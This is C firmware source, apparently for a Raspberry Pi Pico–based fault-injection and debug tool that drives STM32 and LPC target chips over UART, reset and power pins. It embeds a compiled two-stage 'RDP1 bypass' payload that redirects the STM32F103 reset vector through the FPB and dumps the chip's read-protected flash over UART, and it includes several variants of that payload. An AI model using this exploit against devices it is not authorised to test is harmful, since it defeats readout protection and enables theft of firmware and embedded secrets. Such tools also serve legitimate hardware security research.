#include "config.h"
#include "uart_cli.h"
#include "swd.h"
#include "stm32_pwner.h"
#include "stm32_breakpoints.h"
#include "glitch.h"
#include "hardware/uart.h"
#include "hardware/gpio.h"
#include "hardware/pwm.h"
#include "hardware/adc.h"
#include "hardware/dma.h"
#include "hardware/structs/padsbank0.h"
#include "pico/stdlib.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

// Shared GPIO IRQ dispatcher — single callback for all GPIO interrupts.
// Pico SDK allows only ONE gpio_set_irq_callback per core; multiple subsystems
// (nRST latch, trace GP22, etc.) register via gpio_irq_register/unregister.
#define GPIO_IRQ_MAX_HANDLERS 4
typedef void (*gpio_irq_fn_t)(uint gpio, uint32_t events);
static struct {
    uint gpio;
    uint32_t events_mask;
    gpio_irq_fn_t fn;
} gpio_irq_handlers[GPIO_IRQ_MAX_HANDLERS];
static int gpio_irq_handler_count = 0;
static bool gpio_irq_callback_installed = false;

static void shared_gpio_irq_callback(uint gpio, uint32_t events) {
    for (int i = 0; i < gpio_irq_handler_count; i++) {
        if (gpio_irq_handlers[i].gpio == gpio &&
            (gpio_irq_handlers[i].events_mask & events)) {
            gpio_irq_handlers[i].fn(gpio, events);
        }
    }
}

static void gpio_irq_register(uint gpio, uint32_t events, gpio_irq_fn_t fn) {
    // Install shared callback once
    if (!gpio_irq_callback_installed) {
        gpio_set_irq_callback(shared_gpio_irq_callback);
        irq_set_enabled(IO_IRQ_BANK0, true);
        gpio_irq_callback_installed = true;
    }
    // Check if already registered for this pin — update in place
    for (int i = 0; i < gpio_irq_handler_count; i++) {
        if (gpio_irq_handlers[i].gpio == gpio && gpio_irq_handlers[i].fn == fn) {
            gpio_irq_handlers[i].events_mask = events;
            gpio_set_irq_enabled(gpio, events, true);
            return;
        }
    }
    if (gpio_irq_handler_count < GPIO_IRQ_MAX_HANDLERS) {
        gpio_irq_handlers[gpio_irq_handler_count].gpio = gpio;
        gpio_irq_handlers[gpio_irq_handler_count].events_mask = events;
        gpio_irq_handlers[gpio_irq_handler_count].fn = fn;
        gpio_irq_handler_count++;
        gpio_set_irq_enabled(gpio, events, true);
    }
}

static void gpio_irq_unregister(uint gpio, gpio_irq_fn_t fn) {
    for (int i = 0; i < gpio_irq_handler_count; i++) {
        if (gpio_irq_handlers[i].gpio == gpio && gpio_irq_handlers[i].fn == fn) {
            gpio_set_irq_enabled(gpio, gpio_irq_handlers[i].events_mask, false);
            // Compact array
            gpio_irq_handler_count--;
            for (int j = i; j < gpio_irq_handler_count; j++) {
                gpio_irq_handlers[j] = gpio_irq_handlers[j + 1];
            }
            return;
        }
    }
}

// STM32F103 blink payload — blinks PA5 (LD2 on Nucleo-F103RB)
// 608 bytes: vector table + 252-NOP sled + debug-aware blink code
// FAST blink (~100ms) = C_DEBUGEN clear (debug domain POR'd)
// SLOW blink (~500ms) = C_DEBUGEN set (debug domain survived)
// Auto-generated from stm32_payloads/f1/led_payload.S
static const uint8_t f103_led_payload[] = {
  0x00, 0x50, 0x00, 0x20, 0x09, 0x00, 0x00, 0x20, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x11, 0x48, 0x01, 0x68,
  0x51, 0xf0, 0x04, 0x01, 0x01, 0x60, 0x64, 0x22, 0x01, 0x3a, 0xfd, 0xd1,
  0x0e, 0x48, 0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11,
  0x01, 0x60, 0x0c, 0x48, 0x01, 0x68, 0x11, 0xf0, 0x01, 0x0f, 0x0c, 0xbf,
  0x0a, 0x4d, 0x0b, 0x4d, 0x0b, 0x4c, 0x20, 0x20, 0x20, 0x60, 0x2a, 0x46,
  0x01, 0x3a, 0xfd, 0xd1, 0x4f, 0xf4, 0x00, 0x10, 0x20, 0x60, 0x2a, 0x46,
  0x01, 0x3a, 0xfd, 0xd1, 0xf3, 0xe7, 0x00, 0x00, 0x18, 0x10, 0x02, 0x40,
  0x00, 0x08, 0x01, 0x40, 0xf0, 0xed, 0x00, 0xe0, 0x80, 0x38, 0x01, 0x00,
  0x80, 0x1a, 0x06, 0x00, 0x10, 0x08, 0x01, 0x40
};

// STM32F103 RDP1 bypass payload — two-stage FPB redirect attack
// 904 bytes: vector table + 252-NOP sled + stage1 (FPB config) + stage2 (UART flash dump)
// Stage 1: Configures FPB to redirect reset vector fetch to SRAM stage2
// Stage 2: Sends "RDP1" + CPUID (4B) + continuous flash via USART1 PA9 @ 115200 baud
// Pico resets target when desired byte count received
// Auto-generated from stm32_payloads/f1/rdp_bypass.S (804 bytes)
static const uint8_t f103_rdp_bypass_payload[] = {
0x00, 0x50, 0x00, 0x20, 0x09, 0x00, 0x00, 0x20, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x3c, 0x48, 0x01, 0x68,
  0x51, 0xf0, 0x04, 0x01, 0x01, 0x60, 0x64, 0x22, 0x01, 0x3a, 0xfd, 0xd1,
  0x39, 0x48, 0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11,
  0x01, 0x60, 0x37, 0x48, 0x37, 0x49, 0x08, 0x60, 0x37, 0x48, 0x03, 0x21,
  0x01, 0x60, 0x20, 0x21, 0x41, 0x60, 0x05, 0x21, 0x81, 0x60, 0x35, 0x4c,
  0x20, 0x20, 0x20, 0x60, 0xfe, 0xe7, 0x00, 0xbf, 0xdf, 0xf8, 0xcc, 0xd0,
  0x2c, 0x48, 0x01, 0x68, 0x51, 0xf0, 0x04, 0x01, 0x41, 0xf4, 0x80, 0x41,
  0x01, 0x60, 0x4c, 0xf2, 0x50, 0x32, 0x01, 0x3a, 0xfd, 0xd1, 0x28, 0x48,
  0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11, 0x01, 0x60,
  0x28, 0x4c, 0x20, 0x20, 0x20, 0x60, 0x29, 0x48, 0x01, 0x68, 0x21, 0xf0,
  0xf0, 0x01, 0x41, 0xf0, 0xa0, 0x01, 0x01, 0x60, 0x26, 0x48, 0x45, 0x21,
  0x01, 0x60, 0x26, 0x48, 0x42, 0xf2, 0x08, 0x01, 0x01, 0x60, 0xc8, 0x22,
  0x01, 0x3a, 0xfd, 0xd1, 0x23, 0x4c, 0x52, 0x20, 0x00, 0xf0, 0x28, 0xf8,
  0x44, 0x20, 0x00, 0xf0, 0x25, 0xf8, 0x50, 0x20, 0x00, 0xf0, 0x22, 0xf8,
  0x31, 0x20, 0x00, 0xf0, 0x1f, 0xf8, 0x1e, 0x4d, 0x2b, 0x68, 0x18, 0x46,
  0x00, 0xf0, 0x1a, 0xf8, 0x18, 0x0a, 0x00, 0xf0, 0x17, 0xf8, 0x18, 0x0c,
  0x00, 0xf0, 0x14, 0xf8, 0x18, 0x0e, 0x00, 0xf0, 0x11, 0xf8, 0x4f, 0xf0,
  0x00, 0x65, 0x2b, 0x68, 0x18, 0x46, 0x00, 0xf0, 0x0b, 0xf8, 0x18, 0x0a,
  0x00, 0xf0, 0x08, 0xf8, 0x18, 0x0c, 0x00, 0xf0, 0x05, 0xf8, 0x18, 0x0e,
  0x00, 0xf0, 0x02, 0xf8, 0x04, 0x35, 0xf0, 0xe7, 0x00, 0xf0, 0xff, 0x00,
  0x21, 0x68, 0x11, 0xf0, 0x80, 0x0f, 0xfb, 0xd0, 0x60, 0x60, 0x70, 0x47,
  0x18, 0x10, 0x02, 0x40, 0x00, 0x08, 0x01, 0x40, 0x3d, 0x02, 0x00, 0x20,
  0x20, 0x00, 0x00, 0x20, 0x00, 0x20, 0x00, 0xe0, 0x10, 0x08, 0x01, 0x40,
  0x00, 0x50, 0x00, 0x20, 0x04, 0x08, 0x01, 0x40, 0x08, 0x38, 0x01, 0x40,
  0x0c, 0x38, 0x01, 0x40, 0x00, 0x38, 0x01, 0x40, 0x00, 0xed, 0x00, 0xe0,
};

// Diagnostic variant of RDP bypass payload (896 bytes)
// Same as above but stage 2 sends register diagnostics before flash dump
// Protocol: "RDP1" + CPUID(4B) + "DIAG" + 7 regs(28B) + flash bytes
// Regs: DHCSR, DEMCR, FP_CTRL, FP_COMP0, VTOR, FLASH_OBR, RCC_CSR
#include "../stm32_payloads/f1/rdp_bypass_diag_hex.h"
#include "../stm32_payloads/f1/rdp_literal_hex.h"
#include "../stm32_payloads/f1/rdp_regdump_hex.h"
#include "../stm32_payloads/f1/rdp_resettest_hex.h"

// RDP bypass constants
#define BYPASS_DUMP_ADDR   0x20004000  // Where stage2 dumps flash
#define BYPASS_DUMP_WORDS  64          // 256 bytes = 64 words
#define BYPASS_MAGIC       0xDEADBEEF  // Marker after dump

// Hardware UART for target (UART1)
#define TARGET_UART_ID uart1
#define TARGET_UART_TX_PIN 4  // GP4
#define TARGET_UART_RX_PIN 5  // GP5

// UART configuration
static uint32_t target_baud = 115200;
static bool target_initialized = false;

// Target type
static target_type_t current_target_type = TARGET_NONE;

// Response buffer
#define TARGET_RESPONSE_SIZE 512
static char target_response[TARGET_RESPONSE_SIZE];
static uint16_t target_response_pos = 0;
static uint16_t target_response_count = 0;

// Sent data tracking for echo removal
static char sent_data[TARGET_RESPONSE_SIZE];
static uint16_t sent_data_len = 0;

// Reset configuration
static uint8_t reset_pin = 15;
static uint32_t reset_period_ms = 300;  // Default 300ms reset period
static bool reset_active_high = false;
static bool reset_pin_initialized = false;

// Power configuration - 3 pins ganged for ~36mA total (3x 12mA drive)
#define POWER_PIN1  10  // GP10
#define POWER_PIN2  11  // GP11
#define POWER_PIN3  12  // GP12
#define POWER_MASK  ((1u << POWER_PIN1) | (1u << POWER_PIN2) | (1u << POWER_PIN3))
static uint32_t power_cycle_time_ms = 300;  // Default 300ms cycle time
static bool power_pin_initialized = false;

// Debug mode
static bool debug_mode = false;

// Transparent bridge timeout (milliseconds)
static uint32_t bridge_timeout_ms = 50;

// Forward declarations (implemented below)
void target_uart_init(uint8_t tx_pin, uint8_t rx_pin, uint32_t baud);
void target_uart_send_byte(uint8_t byte);
void target_reset_config(uint8_t pin, uint32_t period_ms, bool active_high);
void target_uart_clear_response(void);
void target_uart_print_response_hex(void);

// UART RX interrupt handler
void target_uart_irq_handler(void) {
    extern void uart_cli_printf(const char *format, ...);
    extern void uart_cli_send(const char *str);

    while (uart_is_readable(TARGET_UART_ID)) {
        uint8_t byte = uart_getc(TARGET_UART_ID);

        // Display received byte in debug mode
        if (debug_mode) {
            uart_cli_printf("[RX] %02X", byte);
            if (byte >= 32 && byte < 127) {
                uart_cli_printf(" '%c'", byte);
            }
            uart_cli_send("\r\n");
        }

        // Store in response buffer
        if (target_response_pos < TARGET_RESPONSE_SIZE - 1) {
            target_response[target_response_pos++] = byte;
            target_response_count++;
        }
    }
}

void target_init(void) {
    // Initialize reset pin with defaults on startup
    // This ensures TARGET RESET works without explicit configuration
    target_reset_config(reset_pin, reset_period_ms, reset_active_high);

    // Initialize power pins - ganged for higher current, default ON
    const uint8_t power_pins[] = {POWER_PIN1, POWER_PIN2, POWER_PIN3};
    for (int i = 0; i < 3; i++) {
        gpio_init(power_pins[i]);
        gpio_set_dir(power_pins[i], GPIO_OUT);
        gpio_set_drive_strength(power_pins[i], GPIO_DRIVE_STRENGTH_12MA);
    }
    gpio_set_mask(POWER_MASK);  // All ON
    power_pin_initialized = true;

    // Pre-initialize and deinit UART1 to ensure clean state after Pico boot
    // This works around an issue where first UART TX after boot fails
    gpio_init(TARGET_UART_TX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_TX_PIN, GPIO_FUNC_UART);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
    sleep_ms(10);
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_TX_PIN);
    gpio_deinit(TARGET_UART_RX_PIN);
}

// Helper function to wait for and read a response with timeout
static bool wait_for_response(const char *expected, uint32_t timeout_ms) {
    uint32_t start = to_ms_since_boot(get_absolute_time());
    size_t expected_len = strlen(expected);
    size_t match_pos = 0;

    while (to_ms_since_boot(get_absolute_time()) - start < timeout_ms) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t byte = uart_getc(TARGET_UART_ID);

            // Display received byte in debug mode
            if (debug_mode) {
                uart_cli_printf("[RX] %02X", byte);
                if (byte >= 32 && byte < 127) {
                    uart_cli_printf(" '%c'", byte);
                }
                uart_cli_send("\r\n");
            }

            // Store in response buffer
            if (target_response_pos < TARGET_RESPONSE_SIZE - 1) {
                target_response[target_response_pos++] = byte;
                target_response_count++;
            }

            // Check if it matches expected response
            if (byte == expected[match_pos]) {
                match_pos++;
                if (match_pos == expected_len) {
                    return true;  // Found complete match
                }
            } else {
                match_pos = 0;  // Reset match position
            }
        }
        sleep_us(100);  // Small delay to avoid busy waiting
    }

    return false;  // Timeout
}

void target_set_type(target_type_t type) {
    current_target_type = type;
}

target_type_t target_get_type(void) {
    return current_target_type;
}

bool target_enter_bootloader(uint32_t baud, uint32_t crystal_khz) {
    if (current_target_type == TARGET_NONE) {
        uart_cli_send("ERROR: No target type set. Use TARGET <LPC|STM32> first\r\n");
        return false;
    }

    // Initialize UART1 on GP4/GP5 with specified baud
    target_uart_init(TARGET_UART_TX_PIN, TARGET_UART_RX_PIN, baud);

    // Disable UART interrupt during bootloader communication to avoid race conditions
    // We use blocking reads during bootloader sync, so interrupts would interfere
    uart_set_irq_enables(TARGET_UART_ID, false, false);

    // Clear any stale data from UART RX FIFO that may have accumulated
    while (uart_is_readable(TARGET_UART_ID)) {
        uart_getc(TARGET_UART_ID);
    }

    // Suspend trigger detection so PIO UART decoder doesn't match the ACK byte
    glitch_suspend_trigger();

    // Target-specific bootloader entry
    switch (current_target_type) {
        case TARGET_LPC:
            uart_cli_send("Entering LPC ISP bootloader mode...\r\n");

            // Clear response buffer
            target_uart_clear_response();

            // Small delay to ensure target UART is fully ready after reset and UART init
            sleep_ms(10);

            // 1. Send '?' (0x3F) - sync character
            uart_cli_send("Sending '?'...\r\n");
            target_uart_send_byte('?');

            // 2. Wait for 'Synchronized\r\n' response
            uart_cli_send("Waiting for 'Synchronized'...\r\n");
            if (!wait_for_response("Synchronized\r\n", 1000)) {
                uart_cli_send("ERROR: Timeout waiting for 'Synchronized'\r\n");
                return false;
            }

            // 3. Send "Synchronized\r\n"
            uart_cli_send("Sending 'Synchronized'...\r\n");
            const char *sync_msg = "Synchronized\r\n";
            for (int i = 0; sync_msg[i] != '\0'; i++) {
                target_uart_send_byte(sync_msg[i]);
            }

            // 4. Wait for "OK\r\n" response
            uart_cli_send("Waiting for OK...\r\n");
            if (!wait_for_response("OK\r\n", 1000)) {
                uart_cli_send("ERROR: Timeout waiting for first OK\r\n");
                return false;
            }

            // 5. Send crystal frequency
            char freq_msg[16];
            snprintf(freq_msg, sizeof(freq_msg), "%u\r\n", crystal_khz);
            uart_cli_printf("Sending crystal frequency (%u kHz)...\r\n", crystal_khz);
            for (int i = 0; freq_msg[i] != '\0'; i++) {
                target_uart_send_byte(freq_msg[i]);
            }

            // 6. Wait for second "OK\r\n"
            uart_cli_send("Waiting for final OK...\r\n");
            if (!wait_for_response("OK\r\n", 1000)) {
                uart_cli_send("ERROR: Timeout waiting for second OK\r\n");
                return false;
            }

            // 7. Enable echo with "A 1\r\n" (needed for UART glitch triggering)
            uart_cli_send("Enabling echo mode...\r\n");
            const char *echo_on = "A 1\r\n";
            for (int i = 0; echo_on[i] != '\0'; i++) {
                target_uart_send_byte(echo_on[i]);
            }

            // Wait for echo OK
            if (!wait_for_response("0\r\n", 1000)) {
                uart_cli_send("WARNING: Timeout waiting for echo confirmation\r\n");
            }

            uart_cli_send("LPC ISP sync complete. Echo mode enabled.\r\n");
            break;

        case TARGET_STM32F1:
        case TARGET_STM32F3:
        case TARGET_STM32F4:
        case TARGET_STM32L4: {
            uart_cli_send("Entering STM32 bootloader mode...\r\n");
            uart_cli_send("Sending 0x7F for STM32 sync...\r\n");
            // Send 0x7F for STM32 bootloader sync
            target_uart_send_byte(0x7F);

            // Wait for ACK (0x79) or NACK (0x1F) with timeout
            uint32_t start = to_ms_since_boot(get_absolute_time());
            uint32_t timeout_ms = 1000;  // 1 second timeout for bootloader response
            bool got_response = false;

            while (to_ms_since_boot(get_absolute_time()) - start < timeout_ms) {
                if (uart_is_readable(TARGET_UART_ID)) {
                    uint8_t byte = uart_getc(TARGET_UART_ID);
                    if (debug_mode) {
                        uart_cli_printf("[RX] %02X", byte);
                        if (byte >= 32 && byte < 127) {
                            uart_cli_printf(" '%c'", byte);
                        }
                        uart_cli_send("\r\n");
                    }

                    if (byte == 0x79) {
                        uart_cli_send("ACK received\r\n");
                        got_response = true;
                        break;
                    } else if (byte == 0x1F) {
                        uart_cli_send("ERROR: NACK received - bootloader rejected sync\r\n");
                        glitch_resume_trigger();
                        return false;
                    }
                }
                tight_loop_contents();
            }

            if (!got_response) {
                uart_cli_send("ERROR: No response from bootloader (check BOOT0 pin and connections)\r\n");
                glitch_resume_trigger();
                return false;
            }
            break;
        }

        default:
            uart_cli_send("ERROR: Unknown target type\r\n");
            glitch_resume_trigger();
            return false;
    }

    // Resume trigger detection now that sync is complete
    glitch_resume_trigger();

    // Re-enable UART RX interrupts for normal trigger operation
    uart_set_irq_enables(TARGET_UART_ID, true, false);

    uart_cli_printf("OK: Bootloader mode active at %u baud on GP4/GP5\r\n", baud);
    return true;
}

void target_uart_init(uint8_t tx_pin, uint8_t rx_pin, uint32_t baud) {
    target_baud = baud;

    // If Grbl UART is active, deinitialize it first
    // Grbl uses UART1 on GP8/GP9, we need UART1 on GP4/GP5
    extern bool grbl_is_active(void);
    extern void grbl_deinit(void);
    if (grbl_is_active()) {
        grbl_deinit();
    }

    // Always deinitialize first to ensure clean state
    // After Pico boot, UART peripheral and GPIO may be in undefined state
    if (target_initialized) {
        uart_set_irq_enables(TARGET_UART_ID, false, false);
        irq_set_enabled(UART1_IRQ, false);
    }
    uart_deinit(TARGET_UART_ID);  // Always deinit, even on first use

    // Deinitialize GPIO pins to clear any previous state
    // Critical for first use after Pico reboot
    gpio_deinit(tx_pin);
    gpio_deinit(rx_pin);

    // Initialize GPIO pins before UART (like SDK examples)
    gpio_init(tx_pin);
    gpio_init(rx_pin);

    // Initialize UART1
    uart_init(TARGET_UART_ID, baud);

    // Set UART format: STM32 bootloader requires EVEN parity, others use no parity
    if (target_is_stm32(current_target_type)) {
        uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_EVEN);
    } else {
        uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    }

